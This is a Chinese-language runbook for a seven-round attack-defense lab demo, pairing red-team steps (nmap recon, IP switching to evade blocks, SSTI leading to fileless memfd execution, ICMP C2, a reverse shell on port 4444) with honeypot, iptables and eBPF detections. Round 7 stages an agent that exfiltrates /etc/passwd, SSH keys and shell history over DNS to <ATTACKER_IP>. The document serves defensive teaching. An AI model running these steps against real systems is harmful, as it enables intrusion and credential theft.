# Attack-Defense Demo Flow — 7 回合攻防演練腳本

> 這份是 Demo 當天的執行腳本，照著跑就好。
> 每回合大概 2-3 分鐘，全程大約 20-25 分鐘。

---

## 環境需求

### 雙機架構

| 機器 | 角色 | 系統 | 說明 |
|------|------|------|------|
| **Lab 機器** | 靶機 + 藍軍 | Ubuntu 24.04 (原生) | 跑 target、honeypot、eBPF、MDR、SOC |
| **攻擊機** | 紅軍攻擊機 | Ubuntu (原生) | 跑 recon、exploit、C2、reverse shell |

> 紅方已經從 WSL2 移轉至原生 Linux 環境執行。

| 項目 | 說明 |
|------|------|
| 終端數量 | **4 個**（Lab 2 個 + 攻擊機 2 個） |
| Root 權限 | 雙方所需工具運行時若要求 Root 皆需 sudo |
| 安裝 | 兩台都跑 `bash setup_env.sh` |

### 終端配置

| 終端 | 機器 | 角色 | 顏色建議 |
|------|------|------|----------|
| **T1** | Lab | 靶機 (Target + Honeypot) | 白色 |
| **T2** | Lab | 藍軍 (Blue Team) | 藍色 |
| **T3** | 攻擊機 | 紅軍 C2 / Listener | 紅色 |
| **T4** | 攻擊機 | 紅軍攻擊指令 | 黃色 |

> **提示**：T1 需要同時跑靶機和蜜罐，可用 tmux 分割或開兩個子終端。

### 變數替換

在以下所有指令中，替換這些值：

```
<TARGET_IP>   = Lab 機器 IP（例如 100.103.146.70）
<ATTACKER_IP> = 攻擊機 IP（例如 100.103.146.71）
```

---

## 事前準備

```bash
# 安裝環境（只需執行一次）
cd ~/cybersecurity
bash setup_env.sh

# ⚠️ 所有 Lab 端的終端（T1、T2）都必須從同一份 repo 目錄跑！
# honeypot 和 MDR 根據 script 路徑自動算 trap.log 位置，
# 如果從不同 clone 啟動，trap.log 會寫到不同路徑，MDR 讀不到。

# 每次開新終端都要先啟用 venv
source .venv/bin/activate

# 需要 sudo 的工具用這個方式跑（保留 venv 的 Python）：
sudo .venv/bin/python3 <script.py>
```

> **重要**：所有 Python 工具都透過 venv 執行，避免汙染系統環境。

---

## 回合 1 — 偵察 (Reconnaissance)

**目的**：展示紅方怎麼找到目標服務，還有蜜罐的陷阱效果

### T1 — 啟動靶機 + 蜜罐

```bash
# 終端 T1a — 靶機
sudo .venv/bin/python3 target/target_app.py

# 終端 T1b — 蜜罐（另一個子終端或用 & 背景執行）
sudo .venv/bin/python3 target/honeypot.py
```

預期輸出（蜜罐）：
```
=======================================================
  Honeypot (Fake SSH) | 0.0.0.0:2222
  Banner: SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
  Log:    /home/<user>/cybersecurity/trap.log
=======================================================
[*] Waiting for connections...
```

> trap.log 路徑會自動解析成專案根目錄，不管從哪裡啟動都一樣。
> 蜜罐和 MDR 不用手動指定 `--log`，除非你要用自訂路徑。

### T2 — 啟動網路層 MDR

```bash
sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup
```

預期輸出：
```
+====================================================+
|   Blue Team  Network MDR  v1.0                     |
|   Honeypot Trap Monitor + iptables Auto-Block       |
+====================================================+
  Log file : /home/<user>/cybersecurity/trap.log
  Cleanup  : YES

[*] Monitoring trap.log...
```

> **重要**：MDR 要在蜜罐之後或同時啟動。如果 trap.log 有上次 demo 殘留的舊資料，MDR 會自動跳過，只看新增的。建議每次 demo 前先跑 `sudo bash cleanup.sh` 清一下。

### T4 — 紅方偵察

```bash
sudo bash red_team/recon.sh <TARGET_IP>
```

預期輸出（重點）：
```
PORT     STATE SERVICE
2222/tcp open  ssh          ← 蜜罐（看起來像 SSH）
9999/tcp open  abyss        ← 真正目標
```

### 講解要點

- nmap 掃到 port 2222（看起來像 SSH）和 port 9999
- 紅方這時候要判斷哪個是真正目標
- MITRE ATT&CK: **T1595** (Active Scanning)

---

## 回合 1b — 蜜罐觸發 + IP 封鎖

**目的**：展示蜜罐怎麼主動欺敵 — 碰到假服務就直接被封

### T4 — 先準備備用 IP（避免被封後斷線）

```bash
sudo bash red_team/ip_switch.sh add
```

> **重要**：一定要在觸發蜜罐之前先掛好備用 IP！蜜罐觸發後原始 IP 會被 iptables 封鎖，如果沒有備用 IP 就會完全連不上 Lab 機器。

### T4 — 紅方嘗試連線 SSH（踩到蜜罐）

```bash
nc -v <TARGET_IP> 2222
```

預期輸出：
```
Connection to <TARGET_IP> 2222 port [tcp/*] succeeded!
SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.4
```

> 紅方看到 SSH banner，以為是真的 SSH。但蜜罐已記錄 IP。

### T1b — 蜜罐記錄

```
[!] TRAP  2026-04-04 14:25:01  <ATTACKER_IP>:54321
    Logged: <ATTACKER_IP> → trap.log
```

### T2 — MDR 自動封鎖

```
14:25:01   BLOCK      <ATTACKER_IP>    iptables -I INPUT 1 -s <ATTACKER_IP> -j DROP
    ╰─▶ Attacker <ATTACKER_IP> blocked from ALL ports!
```

### T4 — 紅方驗證被封鎖

```bash
# 嘗試連線真正目標 — 失敗
curl -s --connect-timeout 3 http://<TARGET_IP>:9999/
# → 連線超時，所有 port 都被封鎖
```

### 講解要點

- 蜜罐的好處是幾乎不會有 false positive — 正常使用者根本不會去連 port 2222
- iptables 封鎖是 **IP 層級**的，所有 port 都不可達
- MDR 反應速度不到 1 秒（polling interval）
- **弱點**：只封鎖 IP，攻擊者換 IP 就能繞過 → 下一回合展示

---

## 回合 1c — 紅方 IP 切換繞過網路封鎖

**目的**：展示網路層防禦的侷限 — IP 本來就是可以換的

### T4 — 紅方掛載新 IP

```bash
bash red_team/ip_switch.sh add
```

預期輸出會動態偵測您的網卡並產生新 IP（例如從 192.168.1.100 產生 192.168.1.200）：
```
[*] Detected default interface: ens33 (192.168.1.100)
[*] Adding alias IP: 192.168.1.200 on ens33
[+] Done. Current IPs:
    inet 192.168.1.100/24    ← 被封鎖的 IP
    inet 192.168.1.200/24    ← 新的未封鎖 IP
```

### T4 — 用新 IP 測試連線

> 💡 **提示**：上一步會產生一個新的 `ALIAS_IP`，請自行將以下的 `<ALIAS_IP>` 替換為終端顯示出來的實際 IP。

```bash
curl -s --interface <ALIAS_IP> http://<TARGET_IP>:9999/
```

→ 連線成功！新 IP 未被封鎖。

### 講解要點

- 網路層防禦（iptables）只封鎖已知 IP → 攻擊者換 IP 就繞過
- 所以才需要 **Kernel 層** 防禦（eBPF）作為第二道防線
- 防禦要分層：網路層擋已知威脅、Kernel 層擋未知行為

---

## 回合 2 — 紅方攻擊成功（eBPF 藍方 OFF）

**目的**：展示完整 Kill Chain — SSTI → Fileless Agent → ICMP C2

### T3 — 啟動紅方 C2 Server

```bash
sudo .venv/bin/python3 red_team/red_attacker.py -t <TARGET_IP> -l <ATTACKER_IP>
```

預期輸出：
```
+====================================================+
|     Red Team  Fileless ICMP C2  v2.0               |
+====================================================+
  Target : <TARGET_IP>
  C2 IP  : <ATTACKER_IP>

[*] SSTI attack command (paste into another terminal):

  curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."

[*] Waiting for agent beacon...
```

### T4 — 發動攻擊

複製 T3 輸出的 curl 指令，貼上執行：

```bash
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
```

### T3 — 確認 C2 連線

預期輸出：
```
[+] Agent beacon  <TARGET_IP>
    Host=target-machine  UID=0  Kernel=6.8.0-106-generic
```

在 C2 prompt 輸入指令展示控制：

```
C2> whoami
root

C2> id
uid=0(root) gid=0(root)

C2> cat /etc/hostname
target-machine
```

### 講解要點

- **SSTI**：Flask f-string + render_template_string 漏洞
- **Fileless Execution**：memfd_create 在記憶體中建立匿名 fd，不寫入磁碟
- **ICMP Covert C2**：指令透過 ICMP echo request payload 傳輸，AES-256-CTR 加密
- 藍方完全沒有察覺（沒有任何偵測機制運行）
- MITRE ATT&CK: **T1190, T1059.006, T1620, T1027, T1095**

---

## 回合 3 — 藍方上線，發現並清除威脅

**目的**：展示 eBPF 冷啟動掃描能發現已存在的記憶體惡意程式

### T2 — 啟動藍方 eBPF MDR v1

```bash
sudo .venv/bin/python3 blue_team/blue_ebpf_mdr.py --kill
```

預期輸出：
```
+====================================================+
|   Blue Team  eBPF MDR Engine  v1.0                 |
+====================================================+
  Auto-kill : ENABLED

  [!] Found 1 existing memfd process(es):
      PID=12345  COMM=python3  EXE=/memfd: (deleted)
        -> KILLED
```

### T3 — 觀察 Agent 斷線

C2 prompt 輸入指令，預期 timeout：

```
C2> whoami
[timeout — no response from agent]
```

### 講解要點

- 藍方即使**比紅方晚上線**，一樣能透過 `/proc/*/exe` 掃描找到 memfd 進程
- `bpf_send_signal(SIGKILL)` 在 kernel 層直接殺掉進程
- 冷啟動掃描算是補償偵測，彌補 eBPF 只能偵測新事件的限制

---

## 回合 4 — 紅方再次攻擊 → 即時攔截

**目的**：展示 eBPF 即時偵測跟阻斷能力

### T4 — 紅方再次攻擊

再次貼上同一個 curl 指令：

```bash
curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."
```

### T2 — 觀察藍方偵測

預期輸出：
```
TIME       EVENT            SEVERITY      PID      PPID     UID    COMM             ACT        DETAIL
─────────────────────────────────────────────────────────────────────────────────────────────────────
14:30:01   MEMFD_CREATE     HIGH          23456    23400    0      python3          KILLED
```

### T3 — 確認攻擊失敗

C2 不會收到任何 beacon — 因為進程在 memfd_create 執行前就被殺死。

### 講解要點

- `sys_enter_memfd_create` tracepoint 在 syscall **進入時**觸發（尚未執行）
- `bpf_send_signal(9)` 在 kernel 空間直接送出 SIGKILL，沒有 race condition
- 攻擊鏈在**最早階段**（Phase 2 Weaponization）就被截斷
- MITRE ATT&CK Detection: **T1620**

---

## 回合 5 — 紅方換招繞過 eBPF v1

**目的**：展示攻防是持續對抗的 — v1 防禦有盲區

### T2 — 保持 v1 運行中（不要關閉）

### T3 — 切換到 Reverse Shell 攻擊

先 Ctrl+C 關閉舊的 C2 server，然後啟動新的：

```bash
.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
```

> 注意：這個工具**不需要 sudo**（用 TCP 不用 ICMP raw socket）

預期輸出：
```
+====================================================+
|  Red Team  Reverse Shell  v2.0                     |
|  eBPF v1 Bypass — No memfd_create                  |
+====================================================+
  Target : <TARGET_IP>:9999
  Lhost  : <ATTACKER_IP>:4444
  Method : SSTI → fork → connect → dup2 → pty.spawn
  Bypass : No memfd_create, no ICMP, no raw socket

[*] SSTI attack command (paste into another terminal):

  curl -s -X POST http://<TARGET_IP>:9999/diag -d "query=..."

[*] Listening on 0.0.0.0:4444...
```

### T4 — 發動新攻擊

複製 T3 輸出的新 curl 指令，貼上執行。

### T3 — 確認攻擊成功

預期輸出：
```
[+] Reverse shell from <TARGET_IP>:xxxxx
[*] Interactive shell — type 'exit' to quit

target-machine:~$
```

在 shell 中展示控制：
```bash
whoami
id
ls /
```

### T2 — 觀察藍方 v1 完全沒反應

eBPF v1 的 console **沒有任何新的警報**。

### 講解要點

- 紅方發現 v1 只偵測 `memfd_create`、`/proc/fd execve`、`SOCK_RAW`
- 改用普通 TCP 反向 Shell：`socket(SOCK_STREAM)` → `connect()` → `dup2()` → `pty.spawn()`
- 這些全是合法 syscall，v1 沒有 hook → 完全繞過
- **重點**：沒有一勞永逸的防禦，攻擊者會適應
- MITRE ATT&CK: **T1059.006** (新手法)

---

## 回合 6 — 藍方升級偵測 → 再次攔截

**目的**：展示防禦方也能升級，攻防就是一直迭代

### T3 — 先結束 Reverse Shell

在 shell 中輸入 `exit`。

### T2 — 升級到 eBPF MDR v2

Ctrl+C 關閉 v1，啟動 v2：

```bash
sudo .venv/bin/python3 blue_team/blue_ebpf_mdr_v2.py --kill
```

預期輸出：
```
+====================================================+
|   Blue Team  eBPF MDR Engine  v2.0                 |
|   + Reverse Shell & Suspect Port Detection         |
+====================================================+
  Auto-kill : ENABLED
  Suspect   : [4444, 4445, 5555, 1234, 1337]

[*] Compiling & loading eBPF probes...
    tracepoint/syscalls/sys_enter_memfd_create  OK
    tracepoint/syscalls/sys_enter_execve        OK
    tracepoint/syscalls/sys_enter_socket         OK
    tracepoint/syscalls/sys_enter_connect        OK  [v2 NEW]
    tracepoint/syscalls/sys_enter_dup2           OK  [v2 NEW]
    tracepoint/syscalls/sys_enter_dup3           OK  [v2 NEW]
```

### T3 — 再次啟動 Reverse Shell

```bash
.venv/bin/python3 red_team/red_reverse_shell.py -t <TARGET_IP> -l <ATTACKER_IP>
```

### T4 — 再次攻擊

貼上 reverse shell 的 curl 指令。

### T2 — 觀察 v2 偵測

預期輸出：
```
TIME       EVENT              SEVERITY      PID      PPID     UID    COMM             ACT        DETAIL
──────────────────────────────────────────────────────────────────────────────────────────────────────────
14:35:01   SUSPECT_CONNECT    CRITICAL      34567    34500    0      python3          KILLED     connect → <ATTACKER_IP>:4444
    ╰─▶ SUSPECT PORT: PID 34567 connecting to known C2 port 4444
```

### T3 — 確認攻擊被攔截

Listener 不會收到連線（進程在 connect() 前被殺）。

### 講解要點

- v2 新增了 `sys_enter_connect` hook — 監控外連到可疑 port 的 TCP 連線
- v2 新增了 `sys_enter_dup2` / `dup3` hook — 偵測 fd 0/1/2 全被重導向的 reverse shell 模式
- 就算紅方用普通 port（像 80/443），dup2 偵測還是能攔截
- **結論**：攻防就是不斷迭代，沒有哪一方能永遠贏

---

## 回合 7 — 紅方資料外傳（防禦缺口展示）

> **目的**：展示即使兩層防禦都開著，DNS/ICMP covert channel 的 data exfiltration 仍然偵測不到
> **MITRE ATT&CK**: T1005 (Data from Local System), T1048.003 (Exfiltration Over Alternative Protocol)

### T3 — 啟動 Exfil Listener（攻擊機）

```bash
sudo .venv/bin/python3 red_team/exfil_listener.py
```

預期輸出：
```
[*] Exfil Listener starting...
[*] DNS listener on UDP 53 (interface: eth0)
[*] ICMP listener ready
[*] Waiting for incoming data...
```

### T4 — 在靶機部署 Exfil Agent

在已有的 shell session 裡（Round 5 成功連線後、v2 升級前取得的 access），用 base64 one-liner 部署：

```bash
echo '<base64_of_exfil_agent.py>' | base64 -d > /tmp/.cache_update.py
python3 /tmp/.cache_update.py <ATTACKER_IP>
```

Agent 會自動：
1. 蒐集 `/etc/passwd`、`~/.ssh/*`、`~/.bash_history`、`~/vuln_api.py` 等
2. 偵測可用通道（DNS 優先，ICMP 備用）
3. Base32 編碼 + 分塊，透過 DNS query 送出
4. 完成後自動刪除自身

### T3 — 觀察接收

預期輸出：
```
[+] START file_id=a1b2 filename=passwd
[+] Receiving: 0003/0042 (a1b2)
...
[+] END file_id=a1b2 checksum=OK
[+] Saved: ./loot/passwd

[+] START file_id=c3d4 filename=bash_history
...
[+] Saved: ./loot/bash_history
```

### T2 — 觀察 eBPF v2（仍在跑）

**重點：eBPF v2 沒有任何 alert。** DNS query 走的是正常的 UDP 53，不觸發任何被監控的 syscall pattern（沒有 memfd_create、沒有 reverse shell 的 dup2 pattern）。

### 講解要點

- 目前的防禦只監控 C2 建立（memfd、reverse shell），不監控 data exfiltration
- DNS exfiltration 需要另外的偵測機制（分析 DNS query pattern、subdomain 長度異常等）
- 這說明了即使有兩層防禦，攻擊者還是能找到 blind spot
- **結論**：defense-in-depth 是持續的過程，不是部署完就結束

---

## 結尾總結

### 攻防時間線

```
回合1     回合1b       回合1c      回合2         回合3         回合4
偵察   →  蜜罐觸發  →  IP切換   → 紅方攻擊成功 → 藍方清除威脅 → 紅方再攻被擋
nmap      nc 2222      ip alias    SSTI+memfd    cold-start     eBPF kill
          MDR封鎖      繞過封鎖    ICMP C2        /proc scan     memfd blocked

回合5         回合6           回合7
紅方繞過v1 → 藍方升級v2攔截 → 紅方外傳資料（防禦缺口）
reverse shell  connect hook     DNS exfiltration
TCP bypass     port detect      eBPF 偵測不到
```

### 防禦分層架構

```
┌─────────────────────────────────────────────────┐
│  Layer 1 — 網路層 (Network)                     │
│  蜜罐 (honeypot.py) + iptables (blue_mdr_network.py) │
│  → 封鎖已知惡意 IP                               │
├─────────────────────────────────────────────────┤
│  Layer 2 — Kernel 層 (eBPF)                     │
│  v1: memfd + execve + ICMP (blue_ebpf_mdr.py)  │
│  v2: + connect + dup2/dup3 (blue_ebpf_mdr_v2.py)│
│  → 封鎖惡意行為（不管來源 IP）                    │
└─────────────────────────────────────────────────┘
```

### MITRE ATT&CK 覆蓋總表

**攻擊技術：**

| ID | 技術 | 實作 |
|----|------|------|
| T1595 | Active Scanning | nmap recon |
| T1190 | Exploit Public-Facing App | SSTI injection |
| T1059.006 | Python Execution | memfd loader + reverse shell |
| T1620 | Reflective Code Loading | memfd_create → execve |
| T1027 | Obfuscation | Double Base64 + AES-256-CTR |
| T1095 | Non-App Layer Protocol | ICMP covert C2 |
| T1095 | Non-Application Layer Protocol | TCP reverse shell (raw TCP) |
| T1571 | Non-Standard Port | C2 on port 4444 |
| T1005 | Data from Local System | exfil agent 蒐集本機檔案 |
| T1048.003 | Exfil Over Alt Protocol | DNS/ICMP data exfiltration |

**偵測覆蓋：**

| ID | 偵測點 | 機制 | 層級 |
|----|--------|------|------|
| T1595 | Honeypot Trap | `honeypot.py` → `trap.log` | 網路層 |
| — | IP Auto-Block | `blue_mdr_network.py` → iptables | 網路層 |
| T1620 | Reflective Loading | `sys_enter_memfd_create` | Kernel (v1) |
| T1059 | Execution from /proc/fd | `sys_enter_execve` | Kernel (v1) |
| T1095 | Raw ICMP Socket | `sys_enter_socket` | Kernel (v1) |
| T1571 | Non-Standard Port Connect | `sys_enter_connect` | Kernel (v2) |
| T1059.006 | Reverse Shell Pattern | `sys_enter_dup2/dup3` | Kernel (v2) |

---

## 故障排除

| 問題 | 解決方案 |
|------|----------|
| eBPF 載入失敗 | `sudo apt install bpfcc-tools python3-bpfcc linux-headers-$(uname -r)` |
| Flask 啟動失敗 | `pip3 install flask` |
| nmap 權限不足 | `sudo bash red_team/recon.sh` |
| C2 收不到 beacon | 確認防火牆允許 ICMP，兩機器能互 ping |
| Reverse shell 連不上 | 確認防火牆允許 TCP 4444，attacker IP 正確 |
| eBPF v2 誤殺合法進程 | 用 `--whitelist PID1,PID2` 排除 |
| 蜜罐 port 2222 被占用 | `sudo lsof -i :2222` 找出佔用進程 |
| iptables 規則殘留 | `sudo bash cleanup.sh` 一鍵清除 |
| ip_switch.sh IP 不對 | 編輯腳本中的 PRIMARY_IP 和 ALIAS_IP 變數 |
| 上次 demo 殘留影響本次 | `sudo bash cleanup.sh`（清除程序、iptables、log、loot、crontab） |
| 想預覽會清什麼 | `sudo bash cleanup.sh --dry` |

---

## 環境重置

每次 Demo 結束後，跑以下指令清掉所有殘留：

```bash
sudo bash cleanup.sh
```

會清除：殘留程序、iptables 規則、IP alias、log 檔案、loot 目錄、crontab 持久化。

預覽模式（不實際執行）：
```bash
sudo bash cleanup.sh --dry
```
